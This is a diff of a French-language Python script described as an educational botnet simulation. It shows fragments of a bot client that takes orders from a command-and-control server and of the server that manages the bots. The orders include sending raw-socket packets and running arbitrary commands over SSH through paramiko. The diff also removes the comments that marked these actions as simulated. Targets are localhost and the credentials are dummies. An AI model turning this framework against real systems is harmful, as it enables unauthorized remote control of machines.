@@ -12,7 +12,7 @@ import socket
 import threading
 import time
 import argparse
-import paramiko  # Pour simuler des connexions SSH (nécessite un serveur SSH de test)
+import paramiko
 import sys
 
 # --- Fonction globale pour simuler une opération sur raw sockets ---
@@ -22,18 +22,14 @@ def raw_socket_attack_simulation():
     Attention : cette opération peut nécessiter des privilèges administrateur.
     """
     try:
-        # Création d'un socket brut (pour IPv4 et IPPROTO_RAW)
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        # Construction d'un paquet IP simplifié (à titre de simulation)
         packet = b'\x45\x00\x00\x54\x00\x00\x40\x00\x40\x01\xa6\xec' + b'\x00' * 20
-        # Adresse de destination (ici localhost pour la simulation)
         dest_ip = "127.0.0.1"
         s.sendto(packet, (dest_ip, 0))
         return f"Paquet raw socket envoyé à {dest_ip}."
     except Exception as e:
         return "Erreur dans la simulation de raw socket : " + str(e)
 
-# --- Classe représentant le bot (client) ---
 class BotClient:
     def __init__(self, server_ip, server_port):
         self.server_ip = server_ip
@@ -99,12 +95,10 @@ class BotClient:
         elif command.lower() == 'raw_attack':
             return raw_socket_attack_simulation()
         elif command.startswith("ssh "):
-            # Simulation d'une commande SSH avec Paramiko.
             ssh_command = command[4:]
             try:
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                # Utilisation de crédentiels fictifs pour la simulation sur localhost
                 ssh.connect('127.0.0.1', username='user', password='pass')
                 stdin, stdout, stderr = ssh.exec_command(ssh_command)
                 output = stdout.read().decode('utf-8')
@@ -117,17 +111,15 @@ class BotClient:
 
     def start(self):
         self.connect_to_server()
-        # Démarrage du thread de heartbeat
         threading.Thread(target=self.send_heartbeat, daemon=True).start()
         self.listen_for_commands()
 
-# --- Classe représentant le serveur de Commande & Contrôle (C&C) ---
 class CommandAndControlServer:
     def __init__(self, host, port):
         self.host = host
         self.port = port
         self.server_socket = None
-        self.bot_connections = {}  # Dictionnaire {bot_id: (socket, addr)}
+        self.bot_connections = {} 
         self.bot_id_counter = 1
         self.lock = threading.Lock()
 
@@ -219,7 +211,6 @@ class CommandAndControlServer:
             else:
                 print(f"[-] Bot {bot_id} introuvable.")
 
-# --- Fonction principale ---
 def main():
     parser = argparse.ArgumentParser(
         description="Botnet Simulation en Environnement Contrôlé (Usage pédagogique uniquement)"
